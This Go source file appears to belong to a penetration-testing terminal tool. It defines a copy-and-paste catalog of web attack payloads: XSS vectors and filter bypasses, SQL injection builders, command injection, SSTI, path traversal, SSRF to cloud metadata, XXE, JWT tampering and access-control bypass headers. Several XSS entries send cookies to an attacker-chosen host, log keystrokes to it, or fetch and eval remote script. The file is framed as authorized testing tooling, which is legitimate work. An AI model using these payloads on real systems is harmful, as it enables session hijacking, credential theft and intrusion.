package main

// payloadCatalog is a curated, reference-grade set of web-security payloads —
// the "copy a canonical probe, fill the canary/host, paste into your proxy"
// half of the workflow that complements the scanning tools in catalog.go.
//
// These are the same well-known probes catalogued publicly in
// PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
// and the PortSwigger Web Security Academy cheat sheets. They are deliberately
// *detection-first*: each one is meant to confirm whether a sink is reachable
// and how input is treated, not to cause damage. Fill the placeholder, press
// ctrl+y to copy, and drive the actual request from Caido/Burp against a
// target you are authorized to test.
//
// Placeholders reuse the GTFOBins {TOKEN} mechanism (see isPlaceholder in
// tool.go): their value is substituted straight into the payload template.
//   {MARKER}  a unique canary you grep responses for (default: a random-ish tag)
//   {HOST}    your out-of-band / collaborator host for blind (OOB) detection
//   {FILE}    a file path target for traversal / LFI probes
//   {CMD}     a benign command for injection probes (default: a sleep/echo)
//
// The "command" for a payload entry is the bare payload string itself — no
// printf/echo wrapper — so ctrl+y (copy), ctrl+o, and the on-quit print all
// yield exactly the text you paste into your proxy. The TUI stays a cheat
// sheet, not an exploit launcher.
func payloadEntry(name, category, desc, payload string, flags ...Flag) Tool {
	return Tool{
		Name:     name,
		Binary:   payload,
		Category: category,
		Desc:     desc,
		Flags:    flags,
	}
}

var (
	markerFlag = Flag{Flag: "{MARKER}", Name: "Canary", Kind: KindString, Value: "cnry7f3",
		Desc: "Unique tag to grep for in responses — confirms where your input lands"}
	hostFlag = Flag{Flag: "{HOST}", Name: "OOB host", Kind: KindString, Placeholder: "abc.oast.pro",
		Desc: "Your out-of-band collaborator host (Interactsh/Burp Collaborator) for blind detection"}
	fileFlag = Flag{Flag: "{FILE}", Name: "Target file", Kind: KindString, Value: "etc/passwd",
		Desc: "File to attempt to read via traversal (relative, no leading slash)"}
	cmdFlag = Flag{Flag: "{CMD}", Name: "Probe command", Kind: KindString, Value: "sleep 5",
		Desc: "Benign command to prove execution — a timed sleep reads cleanly as blind"}
)

// SQLi builder knobs — composable placeholders woven into the "sqli-build"
// templates below so you can assemble an injection for a specific syntactic
// context and DBMS rather than copying one fixed one-liner. Leading spaces live
// in the templates (Command trims a value's own leading/trailing space), and
// the {SLEEP}/{ERR} choices intentionally carry a nested {T}/{SUB} token that a
// later flag in the same entry fills in.
var (
	sqlQuoteFlag = Flag{Flag: "{Q}", Name: "Break context", Kind: KindChoice, Value: "'",
		Choices: []string{"'", `"`, "')", `")`, "'))"},
		Desc:    "How the query quoted your input — pick the sequence that closes the original value (' / \" string, or paren-wrapped)"}
	sqlCommentFlag = Flag{Flag: "{C}", Name: "Comment", Kind: KindChoice, Value: "-- -",
		Choices: []string{"-- -", "#", "/*"},
		Desc:    "Trailing comment that swallows the rest of the original query (-- - is the whitespace-safe form; # is MySQL)"}
	sqlColsFlag = Flag{Flag: "{COLS}", Name: "UNION columns", Kind: KindString, Value: "NULL,NULL,NULL",
		Desc: "Select list sized to the ORDER BY column count — swap a NULL for your data, e.g. username,password"}
	sqlSleepFlag = Flag{Flag: "{SLEEP}", Name: "Delay primitive", Kind: KindChoice,
		Value: "AND SLEEP({T})",
		Choices: []string{
			"AND SLEEP({T})",
			"AND (SELECT 1 FROM (SELECT SLEEP({T}))x)",
			";SELECT pg_sleep({T})",
			";WAITFOR DELAY '0:0:{T}'",
			"AND DBMS_PIPE.RECEIVE_MESSAGE('a',{T})",
		},
		Desc: "DBMS timing primitive: MySQL SLEEP / stacked-subquery MySQL / Postgres pg_sleep / MSSQL WAITFOR / Oracle RECEIVE_MESSAGE"}
	sqlDelayFlag = Flag{Flag: "{T}", Name: "Delay (s)", Kind: KindInt, Value: "5",
		Desc: "Seconds to sleep — long enough to stand out clearly from normal response latency"}
	sqlCondFlag = Flag{Flag: "{COND}", Name: "Condition", Kind: KindChoice, Value: "1=1",
		Choices: []string{"1=1", "1=2", "(SELECT 1)=1", "SUBSTRING(@@version,1,1)='5'"},
		Desc:    "Boolean oracle — diff a true (1=1) against a false (1=2) response; the last option is a sample data-extraction test"}
	sqlErrFlag = Flag{Flag: "{ERR}", Name: "Error primitive", Kind: KindChoice,
		Value: "AND extractvalue(1,concat(0x7e,({SUB})))",
		Choices: []string{
			"AND extractvalue(1,concat(0x7e,({SUB})))",
			"AND updatexml(1,concat(0x7e,({SUB})),1)",
			"AND 1=CAST(({SUB}) AS INT)",
			"AND 1=CONVERT(INT,({SUB}))",
		},
		Desc: "Forces the DBMS to leak {SUB} inside an error message: MySQL extractvalue/updatexml, Postgres CAST, MSSQL CONVERT"}
	sqlSubFlag = Flag{Flag: "{SUB}", Name: "Leak subquery", Kind: KindString, Value: "SELECT @@version",
		Desc: "Single-row, single-column subquery to surface (Postgres: version(); current_user / database() also work)"}
	sqlStmtFlag = Flag{Flag: "{STMT}", Name: "Stacked statement", Kind: KindString, Value: "SELECT 1",
		Desc: "Statement to run after the ; — only where the driver allows multiple statements (often MSSQL/Postgres)"}
)

var payloadCatalog = []Tool{
	// ── XSS: does my input render as markup / script? ──────────────────────
	payloadEntry("XSS · script canary", "payload · xss",
		"Canonical reflected-XSS probe; fires if input renders unescaped as HTML",
		`<script>alert('{MARKER}')</script>`, markerFlag),
	payloadEntry("XSS · img onerror", "payload · xss",
		"Event-handler vector for contexts that strip <script>",
		`<img src=x onerror=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · svg onload", "payload · xss",
		"SVG onload fires in many sanitizers that allow 'safe' tags",
		`<svg onload=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · attribute breakout", "payload · xss",
		"Breaks out of a double-quoted attribute value into a new handler",
		`"><img src=x onerror=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · javascript: URI", "payload · xss",
		"For sinks that reflect into href/src — classic DOM-XSS lead",
		`javascript:alert('{MARKER}')`, markerFlag),
	payloadEntry("XSS · polyglot", "payload · xss",
		"Context-spanning polyglot (0xsobky) — survives several encodings at once",
		`jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert('{MARKER}') )//`, markerFlag),
	payloadEntry("XSS · DOM hashprobe", "payload · xss",
		"Drop in the URL fragment to test client-side sinks (location.hash → innerHTML)",
		`#<img src=x onerror=alert('{MARKER}')>`, markerFlag),

	// ── XSS: scope identification (don't use bare alert(1)) ────────────────
	payloadEntry("XSS · scope reveal", "payload · xss",
		"Reveals the exact execution scope so a sandbox-domain hit isn't mistaken for a real one",
		`<script>alert(document.domain.concat("\n").concat(window.origin))</script>`),
	payloadEntry("XSS · console.log (stored)", "payload · xss",
		"Non-interactive marker for stored XSS so you don't dismiss a popup on every page load",
		`<script>console.log("{MARKER}\n".concat(document.domain).concat("\n").concat(window.origin))</script>`, markerFlag),
	payloadEntry("XSS · debugger break", "payload · xss",
		"Breaks into the devtools debugger to prove execution where alert() is suppressed",
		`<script>debugger;</script>`),

	// ── XSS: filter / tag-strip bypasses ───────────────────────────────────
	payloadEntry("XSS · nested script strip-bypass", "payload · xss",
		"Nested tags that reassemble into <script> after a naive single-pass strip",
		`<scr<script>ipt>alert('{MARKER}')</scr<script>ipt>`, markerFlag),
	payloadEntry("XSS · fromCharCode", "payload · xss",
		"Builds the alert string from char codes to dodge filters blocking quotes or keywords",
		`"><script>alert(String.fromCharCode(88,83,83))</script>`),
	payloadEntry("XSS · unicode-escaped keyword", "payload · xss",
		"Unicode-escapes 'alert' to slip past blocklists matching the literal function name",
		`<script>alert('{MARKER}')</script>`, markerFlag),
	payloadEntry("XSS · eval hex-escape", "payload · xss",
		"Hex-escaped eval payload for filters that scan for the literal alert( token",
		`<script>eval('\x61lert(\'{MARKER}\')')</script>`, markerFlag),
	payloadEntry("XSS · object entity-encoded URI", "payload · xss",
		"HTML-entity-encoded javascript: URI in an <object> for sinks that block <script>",
		`<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">`),
	payloadEntry("XSS · img unclosed", "payload · xss",
		"Unclosed <img> that still fires onerror where the app strips or appends the closing >",
		`<img src=x onerror=alert('{MARKER}')//`, markerFlag),
	payloadEntry("XSS · img attr-smuggle eval", "payload · xss",
		"Smuggles the call through alt/src so onerror carries no parentheses of its own to filter",
		`<img src=x:alert(alt) onerror=eval(src) alt={MARKER}>`, markerFlag),
	payloadEntry("XSS · empty-tag prefix", "payload · xss",
		"Leading empty <> tag that slips past parsers which only sanitize known tag names",
		`<><img src=1 onerror=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · uppercase entity handler", "payload · xss",
		"All-caps tag with an entity-encoded handler body for sinks that uppercase your input",
		`<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>`),

	// ── XSS: SVG vectors ───────────────────────────────────────────────────
	payloadEntry("XSS · svg space-less", "payload · xss",
		"Space-less <svgonload> that lenient parsers still treat as svg with an onload handler",
		`<svgonload=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · svg id-eval", "payload · xss",
		"Hides the call in the id attribute and evals it, bypassing onload=alert filters",
		`<svg id=alert(1) onload=eval(id)>`),
	payloadEntry("XSS · svg self-closing script (FF)", "payload · xss",
		"Firefox-only self-closing <script> inside <svg> for sanitizers that allow svg children",
		`<svg><script href=data:,alert(1) />`),
	payloadEntry("XSS · svg entity-encoded parens", "payload · xss",
		"HTML entities for the parentheses to evade filters matching alert()",
		`<svg><script>alert&lpar;'{MARKER}'&rpar;`, markerFlag),
	payloadEntry("XSS · svg CDATA title breakout", "payload · xss",
		"CDATA trick that closes <title> and injects script past sanitizers trusting svg text",
		`<svg><title><![CDATA[</title><script>alert('{MARKER}')</script>]]></svg>`, markerFlag),
	payloadEntry("XSS · svg standalone file", "payload · xss",
		"Standalone .svg document that runs script when opened — aimed at upload/avatar sinks",
		`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`),

	// ── XSS: HTML5 auto-trigger tags (no user interaction) ─────────────────
	payloadEntry("XSS · body onload", "payload · xss",
		"Document-level onload for injections that land at the top of the page body",
		`<body onload=alert(/{MARKER}/.source)>`, markerFlag),
	payloadEntry("XSS · autofocus onfocus", "payload · xss",
		"Auto-focusing input fires onfocus with no interaction — strong for stored XSS",
		`<input autofocus onfocus=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · details ontoggle", "payload · xss",
		"Auto-open <details> triggers ontoggle without a click, surviving many tag allowlists",
		`<details/open/ontoggle=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · video onloadstart", "payload · xss",
		"Media element whose onloadstart fires immediately, for contexts that allow <video>",
		`<video src=_ onloadstart=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · marquee onstart", "payload · xss",
		"Legacy <marquee> onstart that still fires in modern browsers and dodges modern filters",
		`<marquee onstart=alert('{MARKER}')>`, markerFlag),

	// ── XSS: hidden-input vectors ──────────────────────────────────────────
	payloadEntry("XSS · hidden input accesskey", "payload · xss",
		"Fires in a hidden field when the victim presses the access-key chord (CTRL+SHIFT+X)",
		`<input type="hidden" accesskey="X" onclick="alert('{MARKER}')">`, markerFlag),
	payloadEntry("XSS · hidden content-visibility", "payload · xss",
		"No-interaction hidden-input vector via the content-visibility auto-state event (FF130/Chrome108+)",
		`<input type="hidden" oncontentvisibilityautostatechange="alert('{MARKER}')" style="content-visibility:auto">`, markerFlag),

	// ── XSS: JS-context breakouts (no surrounding tags) ────────────────────
	payloadEntry("XSS · JS-context minus/confirm", "payload · xss",
		"Breaks out of an expression JS context with no quotes, commenting out the rest of the line",
		`-(confirm)(document.domain)//`),
	payloadEntry("XSS · JS-context statement break", "payload · xss",
		"Terminates the current JS statement, runs your call, and comments out trailing code",
		`;alert('{MARKER}');//`, markerFlag),

	// ── XSS: URI wrappers ──────────────────────────────────────────────────
	payloadEntry("XSS · data: text/html", "payload · xss",
		"data: URI for sinks (iframe src, window.open) that execute an inline HTML document",
		`data:text/html,<script>alert('{MARKER}')</script>`, markerFlag),
	payloadEntry("XSS · data: base64 svg", "payload · xss",
		"Base64 data: URI (an svg onload) for filters that block the literal <script> string",
		`data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+`),
	payloadEntry("XSS · vbscript: (IE)", "payload · xss",
		"Internet Explorer-only vbscript: URI for legacy intranet apps still pinned to IE",
		`vbscript:msgbox("{MARKER}")`, markerFlag),

	// ── XSS: Markdown / CSS / XML rendering sinks ──────────────────────────
	payloadEntry("XSS · markdown link js", "payload · xss",
		"Malicious link target for apps that render user Markdown into anchor href attributes",
		`[{MARKER}](javascript:prompt(document.cookie))`, markerFlag),
	payloadEntry("XSS · markdown link data:", "payload · xss",
		"Markdown link to a base64 data: document for renderers that permit data: URIs",
		`[{MARKER}](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`, markerFlag),
	payloadEntry("XSS · CSS style breakout", "payload · xss",
		"Breaks out of a <style> block mid-value so CSS injection still yields execution",
		`<style>div{background-image:url("</style><svg/onload=alert(document.domain)>")}</style>`),
	payloadEntry("XSS · XML namespaced script", "payload · xss",
		"XHTML-namespaced <script> for documents served or rendered as XML markup",
		`<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert('{MARKER}')</something:script>`, markerFlag),

	// ── XSS: DOM-sink attribute breakout ───────────────────────────────────
	payloadEntry("XSS · DOM attr-breakout hash", "payload · xss",
		"Fragment that first breaks out of an attribute, for DOM sinks dropping location.hash into one",
		`#"><img src=/ onerror=alert('{MARKER}')>`, markerFlag),

	// ── XSS: mutation XSS (re-parsing bypass) ──────────────────────────────
	payloadEntry("XSS · mXSS noscript re-parse", "payload · xss",
		"Mutation-XSS (Kinugawa) the browser re-parses into a live img — bypasses DOMPurify-class sanitizers",
		`<noscript><p title="</noscript><img src=x onerror=alert('{MARKER}')>">`, markerFlag),

	// ── XSS: remote-JS loaders & blind-XSS beacons ─────────────────────────
	payloadEntry("XSS · svg fetch-eval loader", "payload · xss",
		"Pulls and evals a second-stage script from your host, keeping the injected markup tiny",
		`<svg/onload='fetch("//{HOST}/a").then(r=>r.text()).then(eval)'>`, hostFlag),
	payloadEntry("XSS · external script src", "payload · xss",
		"Breaks out and loads your external script — the staple blind-XSS beacon for forms and logs",
		`"><script src=//{HOST}></script>`, hostFlag),
	payloadEntry("XSS · jQuery getScript beacon", "payload · xss",
		"Loads your blind-XSS probe via jQuery on targets that already expose $ (support tickets, forms)",
		`<script>$.getScript("//{HOST}")</script>`, hostFlag),

	// ── XSS: impact PoC (prove it on authorized targets only) ──────────────
	payloadEntry("XSS · cookie exfil PoC", "payload · xss",
		"Exfiltrates document.cookie to your collaborator — canonical proof for a blind/stored hit",
		`<script>new Image().src="//{HOST}/c?="+document.cookie</script>`, hostFlag),
	payloadEntry("XSS · CORS fetch exfil PoC", "payload · xss",
		"POSTs the cookie to your host via fetch, demonstrating data exfiltration impact",
		`<script>fetch("//{HOST}",{method:"POST",mode:"no-cors",body:document.cookie})</script>`, hostFlag),
	payloadEntry("XSS · keylogger PoC", "payload · xss",
		"Streams keystrokes to your collaborator to demonstrate credential-capture impact",
		`<img src=x onerror='document.onkeypress=function(e){fetch("//{HOST}/?k="+String.fromCharCode(e.which))},this.remove();'>`, hostFlag),

	// ── SQL injection: is my input parsed as SQL? ──────────────────────────
	payloadEntry("SQLi · quote probe", "payload · sqli",
		"Single quote — the one-character test for a broken SQL string context",
		`'`),
	payloadEntry("SQLi · auth bypass", "payload · sqli",
		"Classic tautology for login forms where the query isn't parameterised",
		`' OR '1'='1' -- `),
	payloadEntry("SQLi · UNION column count", "payload · sqli",
		"Order-by ramp to find the column count before a UNION SELECT",
		`' ORDER BY 1-- `),
	payloadEntry("SQLi · UNION select", "payload · sqli",
		"UNION probe — adjust NULLs to the column count found above",
		`' UNION SELECT NULL,NULL,NULL-- `),
	payloadEntry("SQLi · boolean blind", "payload · sqli",
		"True/false pair — compare responses to confirm blind injection",
		`' AND 1=1-- `),
	payloadEntry("SQLi · time blind (MySQL)", "payload · sqli",
		"Timing oracle for fully blind contexts (MySQL/MariaDB)",
		`' AND SLEEP(5)-- `),
	payloadEntry("SQLi · time blind (Postgres)", "payload · sqli",
		"Timing oracle for PostgreSQL",
		`'; SELECT pg_sleep(5)-- `),
	payloadEntry("SQLi · time blind (MSSQL)", "payload · sqli",
		"Timing oracle for SQL Server",
		`'; WAITFOR DELAY '0:0:5'-- `),

	// ── SQLi builders: compose an injection for your context + DBMS ────────
	// Unlike the fixed probes above, these weave configurable knobs (quote
	// context, comment, DBMS primitive, column list, …) into a template so you
	// can tailor one payload to the exact sink you're testing. Pick the entry,
	// set the flags with ←/→ and typing, then ctrl+y to copy into your proxy.
	payloadEntry("SQLi · build: auth bypass", "payload · sqli-build",
		"Tautology login bypass — set the quote context to whatever closes the username value",
		`{Q} OR 1=1{C}`, sqlQuoteFlag, sqlCommentFlag),
	payloadEntry("SQLi · build: boolean blind", "payload · sqli-build",
		"Flip {COND} between a true and false test and diff the responses to confirm blind SQLi",
		`{Q} AND {COND}{C}`, sqlQuoteFlag, sqlCondFlag, sqlCommentFlag),
	payloadEntry("SQLi · build: time blind", "payload · sqli-build",
		"DBMS-selectable timing oracle for fully blind contexts — adjust the quote context and delay",
		`{Q} {SLEEP}{C}`, sqlQuoteFlag, sqlSleepFlag, sqlDelayFlag, sqlCommentFlag),
	payloadEntry("SQLi · build: UNION extract", "payload · sqli-build",
		"UNION SELECT with an editable column list — size {COLS} to the ORDER BY count, carry data in a text column",
		`{Q} UNION SELECT {COLS}{C}`, sqlQuoteFlag, sqlColsFlag, sqlCommentFlag),
	payloadEntry("SQLi · build: error-based extract", "payload · sqli-build",
		"Leaks {SUB} through a DBMS error message, for contexts where output isn't reflected directly",
		`{Q} {ERR}{C}`, sqlQuoteFlag, sqlErrFlag, sqlSubFlag, sqlCommentFlag),
	payloadEntry("SQLi · build: stacked query", "payload · sqli-build",
		"Appends a second statement after a ; — only for drivers that permit multiple statements",
		`{Q};{STMT}{C}`, sqlQuoteFlag, sqlStmtFlag, sqlCommentFlag),

	// ── Command injection ──────────────────────────────────────────────────
	payloadEntry("CMDi · separators", "payload · cmd-injection",
		"Shell metacharacter chain — runs {CMD} alongside the intended command",
		`; {CMD} #`, cmdFlag),
	payloadEntry("CMDi · backtick/substitution", "payload · cmd-injection",
		"Command substitution for contexts that swallow separators",
		"`{CMD}`", cmdFlag),
	payloadEntry("CMDi · blind OOB", "payload · cmd-injection",
		"Blind detection — resolves your collaborator host so a DNS hit proves exec",
		`; nslookup {MARKER}.{HOST} #`, markerFlag, hostFlag),

	// ── SSTI: server-side template injection ───────────────────────────────
	payloadEntry("SSTI · math probe", "payload · ssti",
		"Universal detector — a reflected '49' means the expression was evaluated",
		`${7*7}{{7*7}}<%= 7*7 %>`),
	payloadEntry("SSTI · Jinja2 marker", "payload · ssti",
		"Confirms Jinja2/Flask once ${7*7} hints at a template engine",
		`{{'{MARKER}'.upper()}}`, markerFlag),
	payloadEntry("SSTI · Freemarker", "payload · ssti",
		"Java/Freemarker evaluation probe",
		`${{<%[%'"}}%\`+"`"+`.`),

	// ── Path traversal / LFI ───────────────────────────────────────────────
	payloadEntry("Traversal · dot-dot-slash", "payload · path-traversal",
		"Plain ../ climb to a known file — the baseline traversal test",
		`../../../../{FILE}`, fileFlag),
	payloadEntry("Traversal · URL-encoded", "payload · path-traversal",
		"%2e%2e%2f encoding for filters that only match literal ../",
		`%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}`, fileFlag),
	payloadEntry("Traversal · double-encoded", "payload · path-traversal",
		"Double URL-encoding to slip past a single decode pass",
		`%252e%252e%252f%252e%252e%252f{FILE}`, fileFlag),
	payloadEntry("LFI · php filter wrapper", "payload · path-traversal",
		"Base64-wraps a PHP source file so it leaks instead of executing",
		`php://filter/convert.base64-encode/resource={FILE}`, fileFlag),

	// ── SSRF ───────────────────────────────────────────────────────────────
	payloadEntry("SSRF · localhost", "payload · ssrf",
		"Point a server-side fetch back at itself to reach internal-only services",
		`http://127.0.0.1/`),
	payloadEntry("SSRF · cloud metadata", "payload · ssrf",
		"IMDSv1 metadata endpoint — a hit often yields cloud credentials",
		`http://169.254.169.254/latest/meta-data/`),
	payloadEntry("SSRF · OOB canary", "payload · ssrf",
		"Blind SSRF detector — a request to your collaborator proves the fetch fired",
		`http://{MARKER}.{HOST}/`, markerFlag, hostFlag),
	payloadEntry("SSRF · decimal IP bypass", "payload · ssrf",
		"127.0.0.1 as a single decimal — slips past naive host allowlists",
		`http://2130706433/`),

	// ── Open redirect ──────────────────────────────────────────────────────
	payloadEntry("Open redirect · //host", "payload · open-redirect",
		"Protocol-relative target for redirect params that assume a local path",
		`//{HOST}/%2f..`, hostFlag),
	payloadEntry("Open redirect · @ trick", "payload · open-redirect",
		"Userinfo trick — target treated as credentials for your host",
		`https://expected-domain.com@{HOST}/`, hostFlag),

	// ── XXE ────────────────────────────────────────────────────────────────
	payloadEntry("XXE · file read", "payload · xxe",
		"External-entity probe for XML parsers — reflects a local file if vulnerable",
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///{FILE}">]><r>&x;</r>`, fileFlag),
	payloadEntry("XXE · OOB exfil", "payload · xxe",
		"Blind XXE — forces the parser to call out to your collaborator host",
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{HOST}/xxe">]><r>&x;</r>`, hostFlag),

	// ── NoSQL / LDAP / CRLF / headers ──────────────────────────────────────
	payloadEntry("NoSQLi · operator inject", "payload · nosqli",
		"MongoDB operator injection for JSON auth bodies ({\"user\":{\"$ne\":null}})",
		`{"$ne": null}`),
	payloadEntry("LDAPi · wildcard", "payload · ldapi",
		"Wildcard/always-true filter for LDAP-backed login",
		`*)(uid=*))(|(uid=*`),
	payloadEntry("CRLF · header inject", "payload · crlf",
		"Encoded CR/LF to split the response and inject a header",
		`%0d%0aSet-Cookie:%20{MARKER}=1`, markerFlag),
	payloadEntry("Host header · routing", "payload · host-header",
		"Spoofed Host for password-reset poisoning and cache tricks (set as the Host header)",
		`{HOST}`, hostFlag),

	// ── Auth / tokens ──────────────────────────────────────────────────────
	payloadEntry("JWT · alg none", "payload · jwt",
		"Unsigned 'none'-algorithm header — test if the server skips signature checks",
		`{"alg":"none","typ":"JWT"}`),

	// ── Access control / privilege escalation ──────────────────────────────
	// Authorization is per-request: an endpoint that trusts a client-supplied
	// id, role, or path is the web equivalent of local privesc. These are
	// detection-first — swap one value, resend from your proxy as the
	// low-priv session, and diff the response against the legitimate owner's.
	payloadEntry("IDOR / BOLA · object id swap", "payload · privesc",
		"Horizontal escalation: replace your own object id with another user's in the path/param/body and resend as your session — a 200 with their data is a broken-object-level-auth finding",
		`{ID}`, Flag{Flag: "{ID}", Name: "Victim object id", Kind: KindString, Placeholder: "1337",
			Desc: "An id you shouldn't own — adjacent integer, another account's UUID, or a predictable value (orderId, userId, filename)"}),
	payloadEntry("Mass assignment · role field", "payload · privesc",
		"Vertical escalation: add a privileged attribute the UI never sends to a create/update JSON body — if the model binds it blindly you promote yourself",
		`{"{FIELD}": true}`, Flag{Flag: "{FIELD}", Name: "Privilege field", Kind: KindChoice, Value: "isAdmin",
			Choices: []string{"isAdmin", "admin", "is_staff", "role", "verified", "approved", "accountType"},
			Desc:    "Backend attribute that governs privilege — guess from the app's language/framework or leaked JSON responses"}),
	payloadEntry("Forced browsing · admin function", "payload · privesc",
		"Vertical escalation by missing function-level access control: request a privileged route directly as a low-priv user — many apps only hide the link, not the handler",
		`/{PATH}`, Flag{Flag: "{PATH}", Name: "Privileged path", Kind: KindString, Placeholder: "admin/users",
			Desc: "An admin/internal endpoint discovered via JS, ffuf, or swagger (e.g. admin/users, api/v1/users/promote)"}),
	payloadEntry("403 bypass · rewrite headers", "payload · privesc",
		"When an admin path 403s at the edge, these headers make a trusting backend treat the request as internal/already-routed — set one per request and compare",
		`X-Original-URL: /{PATH}`, Flag{Flag: "{PATH}", Name: "Blocked path", Kind: KindString, Placeholder: "admin",
			Desc: "The path the proxy/WAF blocks — also try X-Rewrite-URL, X-Forwarded-For: 127.0.0.1, X-Forwarded-Host, and path tricks /./admin, /admin/., /admin%2f.."}),
	payloadEntry("Method override · authz bypass", "payload · privesc",
		"When only one HTTP method is access-controlled, this header (honoured by many frameworks) smuggles the privileged verb through a GET/POST the gateway allows",
		`X-HTTP-Method-Override: {VERB}`, Flag{Flag: "{VERB}", Name: "Smuggled method", Kind: KindChoice, Value: "PUT",
			Choices: []string{"PUT", "DELETE", "PATCH"},
			Desc:    "The restricted verb to tunnel — also try X-HTTP-Method and X-Method-Override with the same value"}),
	payloadEntry("JWT · privilege claim tamper", "payload · privesc",
		"Pairs with 'JWT · alg none' / weak-key cracking: flip a role claim in the payload and re-sign — if the server trusts it unverified you escalate vertically",
		`{"{CLAIM}":"{VALUE}"}`,
		Flag{Flag: "{CLAIM}", Name: "Role claim", Kind: KindString, Value: "role",
			Desc: "The claim that encodes privilege (role, scope, groups, admin, is_admin)"},
		Flag{Flag: "{VALUE}", Name: "Escalated value", Kind: KindString, Value: "admin",
			Desc: "The privileged value to assert (admin, superuser, true)"}),
}

// Wire the payload library into the main catalog without touching catalog.go's
// literal. init runs after package-level vars are initialised, so appending
// here is safe and keeps the two sets in separate files.
func init() {
	catalog = append(catalog, payloadCatalog...)
}
